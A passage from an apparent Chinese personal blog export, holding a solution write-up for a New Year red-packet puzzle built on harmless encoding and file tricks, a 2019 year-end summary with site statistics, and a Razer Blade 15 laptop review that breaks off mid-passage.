href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, 